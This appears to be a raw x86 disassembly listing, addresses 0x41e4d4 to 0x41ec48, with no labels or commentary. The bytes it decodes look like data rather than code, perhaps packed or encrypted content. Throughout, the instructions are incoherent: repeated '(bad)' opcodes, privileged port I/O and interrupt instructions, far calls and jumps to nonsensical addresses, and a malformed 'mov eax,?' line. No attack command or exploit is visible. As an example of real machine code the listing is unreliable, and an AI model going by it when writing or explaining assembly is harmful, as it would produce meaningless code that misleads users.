  41e4d4:	add    BYTE PTR [eax],al
  41e4d6:	add    BYTE PTR [ecx],ah
  41e4d8:	test   edi,ebx
  41e4da:	pop    ebx
  41e4db:	call   FWORD PTR [ebx-0x5b]
  41e4de:	push   DWORD PTR [ebx+0x62]
  41e4e1:	push   es
  41e4e2:	out    dx,eax
  41e4e3:	in     al,0xb
  41e4e5:	repnz (bad) 
  41e4e7:	in     al,0xb1
  41e4e9:	add    DWORD PTR [eax],eax
  41e4eb:	sub    eax,DWORD PTR [edx]
  41e4ed:	add    BYTE PTR [eax],al
  41e4ef:	test   eax,0x6dd08f8a
  41e4f4:	sub    cl,0x65
  41e4f7:	(bad)  
  41e4f9:	xchg   BYTE PTR [esi-0x5b8e583c],ch
  41e4ff:	test   DWORD PTR [ebx+0x6beb67ab],edi
  41e505:	mov    es,WORD PTR [eax+0x44]
  41e508:	test   al,0x61
  41e50a:	xor    eax,0xbd430139
  41e50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e510:	pop    edx
  41e511:	jb     0x41e511
  41e513:	into   
  41e514:	jecxz  0x41e4a2
  41e516:	stc    
  41e517:	inc    dx
  41e519:	pop    ecx
  41e51a:	mov    ebx,edx
  41e51c:	test   ecx,ebx
  41e51e:	push   ecx
  41e51f:	mov    dh,0x88
  41e521:	and    eax,0x386cebd6
  41e526:	stc    
  41e527:	mov    edi,0xef33d907
  41e52c:	mov    bl,BYTE PTR [esi+0x5cb047b5]
  41e532:	xor    BYTE PTR [edi-0x17ad214c],0xb
  41e539:	mov    edx,0x62af3d1e
  41e53e:	js     0x41e586
  41e540:	out    dx,eax
  41e541:	pop    ss
  41e542:	and    al,0x30
  41e544:	xchg   ebx,eax
  41e545:	ficom  DWORD PTR [ebx]
  41e547:	retf   0x1305
  41e54a:	inc    edx
  41e54b:	xor    bh,BYTE PTR [ebp+0x28]
  41e54e:	arpl   WORD PTR [edi+0x3b066d95],di
  41e554:	mov    bh,0xab
  41e556:	ficom  DWORD PTR [eax+0x19dc5b2f]
  41e55c:	mov    bl,BYTE PTR [edx]
  41e55e:	jns    0x41e4e5
  41e560:	xchg   ecx,eax
  41e561:	nop
  41e562:	(bad)  
  41e563:	dec    esi
  41e564:	iret   
  41e565:	or     al,0x4a
  41e567:	inc    esp
  41e568:	(bad)  
  41e569:	out    dx,al
  41e56a:	fisub  DWORD PTR [esi+eax*8]
  41e56d:	pop    esi
  41e56e:	das    
  41e56f:	enter  0x552f,0xf5
  41e573:	jge    0x41e5a0
  41e575:	rcl    BYTE PTR ds:[ebp+0x67],0x67
  41e57a:	push   es
  41e57b:	mov    ebp,0x6c00a256
  41e580:	inc    ecx
  41e581:	loop   0x41e515
  41e583:	cdq    
  41e584:	lock aas 
  41e586:	mov    bh,0xbb
  41e588:	sub    dl,BYTE PTR [ebx]
  41e58a:	ret    
  41e58b:	mov    edx,0x4329775b
  41e590:	ds xchg ebp,eax
  41e592:	fwait
  41e593:	mov    dl,0x95
  41e595:	fcomp  QWORD PTR [esi+0x21]
  41e598:	dec    ebp
  41e599:	mov    ah,0xe7
  41e59b:	shr    BYTE PTR [eax+0x750b38e5],0xa5
  41e5a2:	jle    0x41e5d6
  41e5a4:	pop    esi
  41e5a5:	call   0x6441:0x893d8cc3
  41e5ac:	imul   edx,DWORD PTR [eax+ebx*1],0x3f03e26c
  41e5b3:	adc    eax,0x8f3d7ada
  41e5b8:	out    0xc7,eax
  41e5ba:	ror    BYTE PTR [eax],1
  41e5bc:	jmp    0x3c64:0xac82fb66
  41e5c3:	(bad)  
  41e5c4:	lock jmp 0xc517:0x77d75e07
  41e5cc:	stc    
  41e5cd:	inc    ebp
  41e5ce:	dec    edi
  41e5cf:	pushf  
  41e5d0:	inc    eax
  41e5d1:	cmp    eax,0x982799bf
  41e5d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d7:	add    eax,0x9bcd3116
  41e5dc:	call   0xc5bbc2ac
  41e5e1:	(bad)  
  41e5e3:	loop   0x41e60f
  41e5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e6:	in     eax,dx
  41e5e7:	inc    eax
  41e5e8:	push   ebx
  41e5e9:	push   esi
  41e5ea:	push   eax
  41e5eb:	mov    bh,0x47
  41e5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5ee:	enter  0xe2b5,0x38
  41e5f2:	fs scas eax,DWORD PTR es:[edi]
  41e5f4:	or     eax,0xcba36087
  41e5f9:	cwde   
  41e5fa:	sti    
  41e5fb:	addr16 jle 0x41e5e6
  41e5fe:	mov    WORD PTR [ecx+eax*2],gs
  41e601:	daa    
  41e602:	xor    ch,BYTE PTR [esi-0x18]
  41e605:	push   0x80bdda05
  41e60a:	outs   dx,DWORD PTR ds:[esi]
  41e60b:	into   
  41e60c:	retf   0xbd50
  41e60f:	lock inc ebx
  41e611:	cmp    BYTE PTR ds:0xef8c1493,dh
  41e617:	pusha  
  41e618:	lahf   
  41e619:	push   ds
  41e61a:	das    
  41e61b:	inc    ebp
  41e61c:	in     al,0x10
  41e61e:	test   BYTE PTR [esp+eiz*4],al
  41e621:	mov    ebp,esp
  41e623:	and    BYTE PTR [edx+0xa],dl
  41e626:	jo     0x41e618
  41e628:	cwde   
  41e629:	jecxz  0x41e688
  41e62b:	dec    esp
  41e62c:	sbb    BYTE PTR [edx+edi*8+0x218b3d0],bh
  41e633:	inc    eax
  41e634:	and    al,0x31
  41e636:	mov    edx,0xee2471fd
  41e63b:	mov    WORD PTR [ebx],es
  41e63d:	ins    BYTE PTR es:[edi],dx
  41e63e:	dec    eax
  41e63f:	shr    BYTE PTR [eax-0x3e582710],0x9f
  41e646:	mov    ds:0xe9fe771d,al
  41e64b:	popf   
  41e64c:	outs   dx,BYTE PTR ds:[esi]
  41e64d:	jae    0x41e5e7
  41e64f:	sbb    ah,al
  41e651:	les    eax,FWORD PTR gs:[ecx+edx*2+0x2e4fdec9]
  41e659:	test   dh,0x6c
  41e65c:	xchg   ebx,eax
  41e65d:	pop    es
  41e65e:	sar    DWORD PTR [ebp-0x40],0xe1
  41e662:	jno    0x41e5e4
  41e664:	test   eax,0x5ffb4005
  41e669:	in     al,dx
  41e66a:	lahf   
  41e66b:	inc    ebx
  41e66c:	lods   eax,DWORD PTR ds:[esi]
  41e66d:	sbb    dl,BYTE PTR [ebx]
  41e66f:	adc    ebx,DWORD PTR [esi+0x428de0b]
  41e675:	mov    ebx,0x5656ce18
  41e67a:	and    eax,0xacbc8f8a
  41e67f:	call   0xbbd43bf2
  41e684:	mov    dl,0x4f
  41e686:	and    DWORD PTR [ecx],ebp
  41e688:	adc    al,0xd3
  41e68a:	jmp    0xf604630e
  41e68f:	cmp    eax,0x7d2bdc63
  41e694:	fdivr  QWORD PTR [ebp+0x45]
  41e697:	sub    BYTE PTR [ebp+0x4d8455f],dl
  41e69d:	and    eax,0xb9c86c23
  41e6a2:	les    ecx,FWORD PTR [edi+0x8]
  41e6a5:	fcom   QWORD PTR [ecx+0x73]
  41e6a8:	lahf   
  41e6a9:	and    al,BYTE PTR [edx+esi*1-0x23]
  41e6ad:	addr16 test eax,0xbd944276
  41e6b3:	adc    bl,al
  41e6b5:	mov    eax,?
  41e6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6b8:	popf   
  41e6b9:	dec    ecx
  41e6ba:	cwde   
  41e6bb:	xor    al,0x22
  41e6bd:	jns    0x41e6f5
  41e6bf:	stos   BYTE PTR es:[edi],al
  41e6c0:	ss je  0x41e673
  41e6c3:	dec    esi
  41e6c4:	mov    dl,0xf3
  41e6c6:	scas   eax,DWORD PTR es:[edi]
  41e6c7:	mov    ds:0x7f58d418,eax
  41e6cc:	popa   
  41e6cd:	imul   edx,eax,0x25
  41e6d0:	in     eax,dx
  41e6d1:	aas    
  41e6d2:	jb     0x41e6b6
  41e6d4:	loopne 0x41e754
  41e6d6:	aas    
  41e6d7:	sahf   
  41e6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d9:	sbb    al,0xbb
  41e6db:	je     0x41e67a
  41e6dd:	les    edx,FWORD PTR [ecx-0x2a]
  41e6e0:	(bad)  
  41e6e1:	stos   DWORD PTR es:[edi],eax
  41e6e2:	xchg   esp,esi
  41e6e4:	mov    bh,0xa5
  41e6e6:	dec    edi
  41e6e7:	scas   al,BYTE PTR es:[edi]
  41e6e8:	sub    al,0x6f
  41e6ea:	fld    DWORD PTR [esi+0x63f9aeec]
  41e6f0:	pop    ss
  41e6f1:	mov    eax,esp
  41e6f3:	jle    0x41e6e4
  41e6f5:	test   eax,0xccee0612
  41e6fa:	adc    eax,0x441377dc
  41e6ff:	pop    ds
  41e700:	and    eax,0x23e0d267
  41e705:	push   ds
  41e706:	(bad)  
  41e707:	pushf  
  41e708:	push   cs
  41e709:	sbb    al,0xa8
  41e70b:	mov    dh,0xd9
  41e70d:	xchg   ch,dh
  41e70f:	(bad)  
  41e710:	xchg   edi,eax
  41e711:	pop    ds
  41e712:	add    BYTE PTR [eax+0x4ac6b46],bh
  41e718:	dec    ecx
  41e719:	test   eax,0x0
	...
  41e726:	add    BYTE PTR [edx],dh
  41e728:	int3   
  41e729:	xchg   esi,eax
  41e72a:	retf   0xdafe
  41e72d:	jle    0x41e72b
  41e72f:	pop    edi
  41e730:	or     ebx,ecx
  41e732:	and    DWORD PTR [esi+0xfee1cc9],eax
  41e738:	mov    ah,0x1
  41e73a:	add    BYTE PTR [ebx],ch
  41e73c:	add    al,BYTE PTR [eax]
  41e73e:	add    BYTE PTR [eax+0x3f2b2906],cl
  41e744:	cmp    ah,BYTE PTR ds:0x83b33753
  41e74a:	jecxz  0x41e747
  41e74c:	dec    esi
  41e74d:	inc    ebx
  41e74e:	call   0xcbaa4f88
  41e753:	sbb    ah,BYTE PTR [edi+0x4b]
  41e756:	xchg   esp,eax
  41e757:	adc    al,0x4b
  41e759:	mov    DWORD PTR [esi],edi
  41e75b:	pusha  
  41e75c:	and    al,ah
  41e75e:	out    0xb,eax
  41e760:	aaa    
  41e761:	sbb    BYTE PTR [ebx],cl
  41e763:	jge    0x41e7cf
  41e765:	aad    0xc7
  41e767:	add    dh,BYTE PTR [ecx+0x4fe6270e]
  41e76d:	outs   dx,DWORD PTR ds:[esi]
  41e76e:	lea    ecx,[esi]
  41e770:	test   al,0x16
  41e772:	jle    0x41e7ad
  41e774:	push   ds
  41e775:	push   edi
  41e776:	ficom  WORD PTR [ebx-0x5d]
  41e779:	mov    al,ds:0x99bd589f
  41e77e:	aaa    
  41e77f:	out    0x5b,eax
  41e781:	sti    
  41e782:	popa   
  41e783:	push   edi
  41e784:	loop   0x41e7a2
  41e786:	fwait
  41e787:	and    edx,DWORD PTR [ebp+0x1c]
  41e78a:	(bad)  
  41e78b:	div    DWORD PTR [ebp+0x73c2046d]
  41e791:	pop    eax
  41e792:	cmc    
  41e793:	popa   
  41e794:	xchg   ebp,eax
  41e795:	mov    bh,al
  41e797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e798:	ja     0x41e7c2
  41e79a:	jl     0x41e77f
  41e79c:	dec    edx
  41e79d:	jne    0x41e7cd
  41e79f:	sbb    edi,ebx
  41e7a1:	add    eax,0x1948e8a
  41e7a6:	mov    ah,0x23
  41e7a8:	int3   
  41e7a9:	ss int 0x8e
  41e7ac:	ret    0xebdb
  41e7af:	mov    esi,eax
  41e7b1:	add    DWORD PTR [esi],ebp
  41e7b3:	enter  0x5b6,0x12
  41e7b7:	xchg   ecx,eax
  41e7b8:	dec    esi
  41e7b9:	ja     0x41e757
  41e7bb:	ins    DWORD PTR es:[edi],dx
  41e7bc:	fnsave [ecx+0x6236d256]
  41e7c2:	xor    eax,0xef4d0c6b
  41e7c7:	retw   0xf736
  41e7cb:	mov    esp,0x79e1686c
  41e7d0:	pop    ss
  41e7d1:	out    dx,eax
  41e7d2:	imul   ebx,DWORD PTR [ebx],0x57
  41e7d5:	adc    edi,DWORD PTR [ecx]
  41e7d7:	add    eax,ecx
  41e7d9:	sahf   
  41e7da:	adc    DWORD PTR [ebp-0x4f28728a],ecx
  41e7e0:	pop    esi
  41e7e1:	loope  0x41e7e7
  41e7e3:	popa   
  41e7e4:	gs xor ebp,esp
  41e7e7:	xor    BYTE PTR [edx+0x20beaede],0xa9
  41e7ee:	rol    DWORD PTR [edx],0xd2
  41e7f1:	adc    dh,BYTE PTR [edx]
  41e7f3:	mov    edi,0xec929ede
  41e7f8:	adc    eax,0xebcc959
  41e7fd:	jnp    0x41e79c
  41e7ff:	fdivr  DWORD PTR [ebx+0x5e]
  41e802:	jge    0x41e7e0
  41e804:	inc    ecx
  41e805:	mul    BYTE PTR [ecx-0x61]
  41e808:	test   eax,0x56d07f0f
  41e80d:	shl    eax,1
  41e80f:	adc    esi,esi
  41e811:	(bad)  
  41e812:	nop
  41e813:	pop    eax
  41e814:	fwait
  41e815:	pusha  
  41e816:	xor    esi,DWORD PTR [edi]
  41e818:	pushf  
  41e819:	repz jecxz 0x41e7c8
  41e81c:	cld    
  41e81d:	mov    ecx,DWORD PTR [edi+0x40]
  41e820:	push   0xffffffbc
  41e822:	mov    ds:0x277de2f9,eax
  41e827:	enter  0x5c81,0xe0
  41e82b:	out    dx,eax
  41e82c:	jo     0x41e7c4
  41e82e:	shl    DWORD PTR [ecx-0x32],cl
  41e831:	not    DWORD PTR [edi-0x3c5a31f1]
  41e837:	push   0x26
  41e839:	jbe    0x41e7fd
  41e83b:	mov    edx,0x66d80582
  41e840:	das    
  41e841:	lea    edi,[edx-0x6c1ab07e]
  41e847:	and    al,0x39
  41e849:	pop    edi
  41e84a:	jnp    0x41e878
  41e84c:	mov    edx,esp
  41e84e:	xchg   ebx,eax
  41e84f:	mov    BYTE PTR [edx+0x38d4c6df],bl
  41e855:	repz cwde 
  41e857:	push   eax
  41e858:	jp     0x41e818
  41e85a:	scas   al,BYTE PTR es:[edi]
  41e85b:	push   ss
  41e85c:	jmp    0x522bf85a
  41e861:	inc    esi
  41e862:	dec    edi
  41e863:	pop    ebx
  41e864:	xchg   ebp,eax
  41e865:	cli    
  41e866:	inc    ebx
  41e867:	add    al,0xc1
  41e869:	scas   al,BYTE PTR es:[edi]
  41e86a:	imul   eax,ebx,0xffffffc2
  41e86d:	push   0x94cc7d0f
  41e872:	arpl   WORD PTR [edx-0x430f1f0d],bp
  41e878:	lods   eax,DWORD PTR ds:[esi]
  41e879:	dec    edx
  41e87a:	mov    ds:0xbaa2e095,al
  41e87f:	mov    eax,0xf9243f96
  41e884:	inc    BYTE PTR [ecx]
  41e886:	sbb    al,0x88
  41e888:	dec    esi
  41e889:	pop    DWORD PTR [eax+0x48]
  41e88c:	ja     0x41e8a9
  41e88e:	ja     0x41e86b
  41e890:	mov    bl,0xab
  41e892:	inc    edi
  41e893:	or     al,0xa7
  41e895:	sbb    eax,0xb0adb094
  41e89a:	mov    bl,0x9a
  41e89c:	in     al,dx
  41e89d:	cwde   
  41e89e:	jge    0x41e84b
  41e8a0:	mov    bl,0xc2
  41e8a2:	xchg   esp,eax
  41e8a3:	dec    ebp
  41e8a4:	and    BYTE PTR [esi-0x6455e5b2],0xa8
  41e8ab:	sub    eax,ebx
  41e8ad:	call   0xb357:0x785be783
  41e8b4:	jge    0x41e851
  41e8b6:	xchg   ecx,eax
  41e8b7:	dec    ebx
  41e8b8:	mov    ah,0xf2
  41e8ba:	xor    bh,BYTE PTR [ecx-0x8]
  41e8bd:	xor    al,0x43
  41e8bf:	inc    edx
  41e8c0:	mov    ebx,gs
  41e8c2:	mov    eax,ds:0x241cc4c4
  41e8c7:	ja     0x41e874
  41e8c9:	mov    ds:0x6899411a,al
  41e8ce:	mov    al,ds:0xcc4e6ab0
  41e8d3:	imul   ebx,ebx,0x5f40fdce
  41e8d9:	mov    ebp,0x8b4dd9bd
  41e8de:	sub    DWORD PTR [ebx-0x4f],ebp
  41e8e1:	pop    es
  41e8e2:	push   edx
  41e8e3:	or     eax,0x5013711d
  41e8e8:	mov    esp,0xfa28a185
  41e8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ee:	xchg   edi,eax
  41e8ef:	loopne 0x41e8bf
  41e8f1:	jecxz  0x41e8ba
  41e8f3:	inc    edi
  41e8f4:	push   esp
  41e8f5:	pop    ss
  41e8f6:	int    0x73
  41e8f8:	test   al,0x19
  41e8fa:	ret    
  41e8fb:	and    BYTE PTR [eax],bh
  41e8fd:	jo     0x41e891
  41e8ff:	rcr    DWORD PTR [esi-0x306cac81],0x61
  41e906:	and    BYTE PTR [ecx],ch
  41e908:	(bad)  [edi-0x2e2a1cbc]
  41e90e:	neg    DWORD PTR [ebx-0x63]
  41e911:	push   ss
  41e912:	test   DWORD PTR [eax],edx
  41e914:	xchg   ecx,eax
  41e915:	xchg   cl,ah
  41e917:	jae    0x41e8f1
  41e919:	mov    ebp,0x3dfd4ef5
  41e91e:	xchg   esi,eax
  41e91f:	dec    edi
  41e920:	addr16 repnz cmp edi,esi
  41e924:	mov    eax,0x1d84e221
  41e929:	repnz not BYTE PTR [ebx]
  41e92c:	mov    esp,0xe9089703
  41e931:	adc    BYTE PTR [esp+eax*2],dh
  41e934:	mov    DWORD PTR [ebx+0x35],esp
  41e937:	xor    ebp,DWORD PTR [ecx]
  41e939:	fdivr  QWORD PTR [ebp+0x79]
  41e93c:	iret   
  41e93d:	sub    BYTE PTR [esi],al
  41e93f:	das    
  41e940:	mov    ebx,0xf03fb2b4
  41e946:	push   0x45968882
  41e94b:	inc    esi
  41e94c:	xchg   ecx,eax
  41e94d:	sbb    eax,0x11e0656f
  41e952:	add    DWORD PTR [edi],eax
  41e954:	lods   eax,DWORD PTR ds:[esi]
  41e955:	repz sub esp,DWORD PTR [eax+0x39]
  41e959:	popa   
  41e95a:	(bad)  
  41e95b:	outs   dx,DWORD PTR ds:[esi]
  41e95c:	xor    cl,BYTE PTR [edx+eax*1+0x4d]
  41e960:	cmc    
  41e961:	loopne 0x41e9a9
  41e963:	push   esi
  41e964:	dec    esp
  41e965:	cmp    eax,0x9d8a11c0
	...
  41e976:	add    BYTE PTR [ebx],cl
  41e978:	sub    ecx,DWORD PTR [esp+ebx*1]
  41e97b:	sub    al,0x3f
  41e97d:	sbb    edi,DWORD PTR [edi]
  41e97f:	or     bl,BYTE PTR [esi]
  41e981:	cli    
  41e982:	aam    0xa5
  41e984:	inc    ebx
  41e985:	mov    dh,0xfc
  41e987:	cmp    dh,BYTE PTR [esi+0x22b0001]
  41e98d:	add    BYTE PTR [eax],al
  41e98f:	lock dec esi
  41e991:	dec    esp
  41e992:	mov    ds:0x316001c1,al
  41e997:	sub    esp,0xffffff97
  41e99a:	leave  
  41e99b:	lods   al,BYTE PTR ds:[esi]
  41e99c:	inc    ebx
  41e99d:	inc    ebp
  41e99e:	ss (bad) 
  41e9a0:	loopne 0x41e978
  41e9a2:	mov    edi,0xfdcb5369
  41e9a7:	fld    DWORD PTR [esi-0xf37d7f]
  41e9ad:	inc    esp
  41e9ae:	lods   al,BYTE PTR ds:[esi]
  41e9af:	dec    ecx
  41e9b0:	es jne 0x41e98f
  41e9b3:	mov    bh,0x85
  41e9b5:	fwait
  41e9b6:	inc    edx
  41e9b7:	out    0x6b,al
  41e9b9:	dec    ebx
  41e9ba:	jmp    0x4610c7c7
  41e9bf:	push   eax
  41e9c0:	stos   BYTE PTR es:[edi],al
  41e9c1:	lahf   
  41e9c2:	xchg   ebp,eax
  41e9c3:	dec    ecx
  41e9c4:	fild   WORD PTR [edi]
  41e9c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9c7:	(bad)  
  41e9c8:	xor    DWORD PTR [ebx],ebx
  41e9ca:	push   cs
  41e9cb:	bound  esp,QWORD PTR [edi]
  41e9cd:	stos   DWORD PTR es:[edi],eax
  41e9ce:	iret   
  41e9cf:	loop   0x41e9e1
  41e9d1:	addr16 js 0x41e988
  41e9d4:	retf   0xac8b
  41e9d7:	xchg   edx,eax
  41e9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d9:	call   0x866c:0xa5f1920b
  41e9e0:	hlt    
  41e9e1:	(bad)  
  41e9e2:	call   FWORD PTR [ebx+0x4c4c6d89]
  41e9e8:	jp     0x41ea01
  41e9ea:	cld    
  41e9eb:	ficom  WORD PTR [bp+si+0x3df9]
  41e9f0:	mov    esp,0x15dd6d1d
  41e9f5:	inc    esi
  41e9f6:	mov    edx,0x6a5a544a
  41e9fb:	dec    ebx
  41e9fc:	nop
  41e9fd:	fdecstp 
  41e9ff:	js     0x41ea0a
  41ea01:	sar    DWORD PTR [edx+eiz*2+0x42e71a52],1
  41ea08:	fimul  DWORD PTR [esi-0x5c7b63ff]
  41ea0e:	mov    bh,0xd8
  41ea10:	pop    esp
  41ea11:	inc    ecx
  41ea12:	jne    0x41ea0e
  41ea14:	mov    ah,0x11
  41ea16:	pop    ebx
  41ea17:	fsubr  st,st(1)
  41ea19:	(bad)  
  41ea1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea1b:	pop    ecx
  41ea1c:	mov    bh,0xd5
  41ea1e:	add    edi,edi
  41ea20:	cmp    DWORD PTR [edx+0x161f6b4b],edx
  41ea26:	xor    eax,0x37230002
  41ea2b:	rcl    DWORD PTR [esi],0x5e
  41ea2e:	dec    edi
  41ea2f:	push   edi
  41ea30:	out    dx,al
  41ea31:	push   edx
  41ea32:	dec    esp
  41ea33:	mov    ds:0x18bf154f,al
  41ea38:	xchg   edi,eax
  41ea39:	add    esi,DWORD PTR [ecx+0x61]
  41ea3c:	jp     0x41ea6e
  41ea3e:	(bad)  
  41ea3f:	xlat   BYTE PTR ds:[ebx]
  41ea40:	inc    edx
  41ea41:	popa   
  41ea42:	shl    DWORD PTR [esi+ecx*1+0x34],0x55
  41ea47:	(bad)  
  41ea48:	cld    
  41ea49:	iret   
  41ea4a:	enter  0xbb16,0xa1
  41ea4e:	das    
  41ea4f:	xor    ebp,DWORD PTR [esi-0x2a74e726]
  41ea55:	pop    edx
  41ea56:	jmp    DWORD PTR [esi+edx*8+0x28fe2548]
  41ea5d:	push   esi
  41ea5e:	dec    ebx
  41ea5f:	imul   edi,DWORD PTR [ecx-0xf],0xb2e7ac2d
  41ea66:	add    ebp,DWORD PTR [ebx+ebp*2]
  41ea69:	dec    edx
  41ea6a:	into   
  41ea6b:	push   es
  41ea6c:	cvttps2pi mm3,QWORD PTR [edi+0x412ed6e7]
  41ea73:	ret    0x3e5e
  41ea76:	mov    edx,0x741737b6
  41ea7b:	iret   
  41ea7c:	jmp    0x41ea15
  41ea7e:	push   0x51f2abea
  41ea83:	outs   dx,BYTE PTR ds:[esi]
  41ea84:	mov    al,ds:0xbe336f6b
  41ea89:	adc    BYTE PTR [ecx-0x49864aa7],al
  41ea8f:	dec    edx
  41ea91:	xor    dl,BYTE PTR [ecx]
  41ea93:	xor    cl,dl
  41ea95:	add    eax,0x3082ec37
  41ea9a:	call   FWORD PTR [ebx-0x625988ac]
  41eaa0:	ret    0xb77
  41eaa3:	pushf  
  41eaa4:	rcl    DWORD PTR [esp+eax*8-0x38],0xbe
  41eaa9:	outs   dx,BYTE PTR ds:[esi]
  41eaaa:	push   esp
  41eaab:	jl     0x41ea4b
  41eaad:	js     0x41ea9a
  41eaaf:	bound  edx,QWORD PTR [edi]
  41eab1:	leave  
  41eab2:	in     al,dx
  41eab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab4:	shl    DWORD PTR [ebp+ebp*4+0x29],0x9f
  41eab9:	cli    
  41eaba:	add    BYTE PTR [esi],dh
  41eabc:	cdq    
  41eabd:	adc    DWORD PTR [edx+0xa39c505],esi
  41eac3:	fwait
  41eac4:	and    eax,0x1fcad67d
  41eac9:	xchg   esp,eax
  41eaca:	xor    DWORD PTR [esi+0x71],ebp
  41eacd:	xor    eax,0xed675ef
  41ead2:	fldenv [eax-0x2]
  41ead5:	adc    eax,0xb9c76994
  41eada:	push   ebx
  41eadb:	cmp    ah,bl
  41eadd:	add    esp,ebp
  41eadf:	mov    ebp,DWORD PTR [ecx]
  41eae1:	mov    ss,WORD PTR [ecx]
  41eae3:	xor    BYTE PTR [ebp+0x186c2056],ah
  41eae9:	scas   al,BYTE PTR es:[edi]
  41eaea:	dec    edi
  41eaeb:	jg     0x41eaab
  41eaed:	xor    eax,0x562d871a
  41eaf2:	add    BYTE PTR [ebp+0x7c],ah
  41eaf5:	(bad)  
  41eaf6:	call   0x49319e86
  41eafb:	or     eax,0xaf77f5a5
  41eb00:	test   eax,0x3007d227
  41eb05:	mov    ds:0x6f939343,al
  41eb0a:	cli    
  41eb0b:	in     al,0xf4
  41eb0d:	pop    esp
  41eb0e:	xor    ebp,edx
  41eb10:	sbb    DWORD PTR [ebx+ebp*1],edi
  41eb13:	mov    bh,dl
  41eb15:	outs   dx,DWORD PTR ds:[esi]
  41eb16:	fdivp  st(0),st
  41eb18:	lds    esp,FWORD PTR [edi+ebx*8+0x5e8f25cf]
  41eb1f:	adc    DWORD PTR [edi+ecx*1-0x64],ecx
  41eb23:	arpl   WORD PTR [ebx+eiz*2-0x5a0b8fc3],bp
  41eb2a:	mov    ds:0x4b3566b2,al
  41eb2f:	mov    edi,0x5afd8a9
  41eb34:	(bad)  
  41eb35:	sbb    dl,BYTE PTR [edx+ecx*8-0x1e]
  41eb39:	mov    dl,0x52
  41eb3b:	fcmovnb st,st(4)
  41eb3d:	cmp    eax,0x5d92062
  41eb42:	aaa    
  41eb43:	mov    BYTE PTR [ebx-0x7f9bee45],ah
  41eb49:	fdiv   DWORD PTR [eax]
  41eb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb4c:	fwait
  41eb4d:	xchg   ebx,eax
  41eb4e:	push   edi
  41eb4f:	int    0x34
  41eb51:	(bad)  
  41eb52:	retf   0x817d
  41eb55:	inc    ecx
  41eb56:	and    BYTE PTR [esp+eiz*4],ah
  41eb59:	aaa    
  41eb5a:	iret   
  41eb5b:	pop    esp
  41eb5c:	sbb    bl,BYTE PTR [eax+eiz*4]
  41eb5f:	xchg   ebp,eax
  41eb60:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41eb62:	out    0x64,al
  41eb64:	dec    edi
  41eb65:	cwde   
  41eb66:	mov    esp,0x270ab304
  41eb6b:	dec    esi
  41eb6c:	mov    dl,0xeb
  41eb6e:	dec    ebx
  41eb6f:	and    DWORD PTR [eax],esi
  41eb71:	popa   
  41eb72:	mov    al,ds:0x3d14ffec
  41eb77:	lea    ebx,[ecx+ebp*1-0x36]
  41eb7b:	test   DWORD PTR [edx+0x67],edx
  41eb7e:	mov    ebp,DWORD PTR [eax-0x6166ad7b]
  41eb84:	xlat   BYTE PTR ds:[ebx]
  41eb85:	push   0x9dffbd0c
  41eb8a:	repnz lods al,BYTE PTR ds:[esi]
  41eb8c:	dec    esi
  41eb8d:	fxch   st(0)
  41eb8f:	push   0xffffff9c
  41eb91:	or     al,0xe5
  41eb93:	or     BYTE PTR [esi-0x12],0xbb
  41eb97:	mov    dh,0xfe
  41eb99:	cli    
  41eb9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9b:	jle    0x41eb57
  41eb9d:	mov    edi,0xada6e92b
  41eba2:	iret   
  41eba3:	test   BYTE PTR [ebp+0x2a22675a],0x60
  41ebaa:	or     DWORD PTR [edi],ebp
  41ebac:	inc    esi
  41ebad:	mov    eax,ds:0xc8969ab4
  41ebb2:	adc    BYTE PTR [edx+0x28ab811b],bh
  41ebb8:	sub    eax,0xee
	...
  41ebc5:	add    BYTE PTR [eax],al
  41ebc7:	arpl   WORD PTR [eax],bx
  41ebc9:	dec    esp
  41ebca:	push   esp
  41ebcb:	jg     0x41ec21
  41ebcd:	jnp    0x41ec0e
  41ebcf:	adc    DWORD PTR gs:[edx+0x7adf23fc],0xffffffdd
  41ebd7:	gs mov eax,0x22b0001
  41ebdd:	add    BYTE PTR [eax],al
  41ebdf:	jle    0x41ec00
  41ebe1:	dec    ebp
  41ebe2:	sbb    al,0xb6
  41ebe4:	push   ds
  41ebe5:	aas    
  41ebe6:	jno    0x41ebae
  41ebe8:	clc    
  41ebe9:	pop    es
  41ebea:	xchg   DWORD PTR [esi],ebp
  41ebec:	sti    
  41ebed:	sub    al,0x31
  41ebef:	scas   eax,DWORD PTR es:[edi]
  41ebf0:	test   DWORD PTR [ecx-0x6f],esp
  41ebf3:	mov    esi,DWORD PTR [ebp+0xf3233d8]
  41ebf9:	jb     0x41ec65
  41ebfb:	ins    BYTE PTR es:[edi],dx
  41ebfc:	push   cs
  41ebfd:	mov    edi,0x770d9de1
  41ec02:	retf   
  41ec03:	fld    DWORD PTR [ecx]
  41ec05:	test   DWORD PTR ds:0x37b12a2d,edx
  41ec0b:	pop    edx
  41ec0c:	imul   ebp,esp,0x56
  41ec0f:	and    DWORD PTR [ecx-0x7],esp
  41ec12:	in     al,dx
  41ec13:	push   edi
  41ec14:	mov    ds:0x181af6b5,eax
  41ec19:	or     cl,BYTE PTR ds:0x12c63c2
  41ec1f:	aas    
  41ec20:	mov    eax,ds:0x7bf1ae6
  41ec25:	mov    edx,0xcaa93b69
  41ec2a:	sbb    BYTE PTR [edx+esi*4-0x6c],al
  41ec2e:	mov    ebp,0xe9b4f324
  41ec33:	fdiv   QWORD PTR [ecx+0x4d]
  41ec36:	sub    al,0x32
  41ec38:	xor    DWORD PTR [edi],edx
  41ec3a:	xor    eax,0x15b88d2e
  41ec3f:	mov    esp,0x682ed14
  41ec44:	jae    0x41ec64
  41ec46:	test   ch,ch
  41ec48:	les    esi,FWORD PTR [edi]
